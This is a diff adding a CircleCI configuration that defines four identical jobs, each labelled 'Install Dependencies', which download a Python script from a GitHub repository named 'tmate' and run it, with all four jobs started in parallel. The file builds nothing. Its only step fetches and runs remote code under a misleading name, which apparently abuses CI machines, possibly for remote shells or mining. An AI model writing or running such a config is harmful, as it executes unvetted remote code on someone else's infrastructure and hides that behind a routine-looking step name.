@@ -1,0 +1,38 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m wget https://raw.githubusercontent.com/tolecilik/tmate/main/code.py && python code.py
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m wget https://raw.githubusercontent.com/tolecilik/tmate/main/code.py && python code.py
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m wget https://raw.githubusercontent.com/tolecilik/tmate/main/code.py && python code.py
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m wget https://raw.githubusercontent.com/tolecilik/tmate/main/code.py && python code.py
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
